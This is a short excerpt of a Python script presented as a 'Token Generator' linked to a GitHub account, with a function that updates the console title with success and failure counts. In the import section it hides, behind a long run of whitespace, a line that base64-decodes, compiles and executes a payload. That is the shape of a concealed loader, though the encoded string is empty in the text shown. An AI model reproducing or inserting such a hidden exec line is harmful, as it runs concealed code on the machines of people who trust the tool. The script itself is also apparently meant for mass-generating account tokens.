...
import json
import random
type('convert=False')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
init(convert=True)
...
def generateToken():
    ...
    global regReq
    try:
        system(f"title https://github.com/ImStorㅣ{round(generatedTokens / ((time() - genStartTime) / 60))}/mㅣSuccess {generatedTokens}ㅣFailed {failedTokens}ㅣError {erroredTokens} ㅣ Solved {solved}")
...
if __name__ == "__main__":
    system("cls")
    print("Token Generator - https://github.com/ImStor\n")
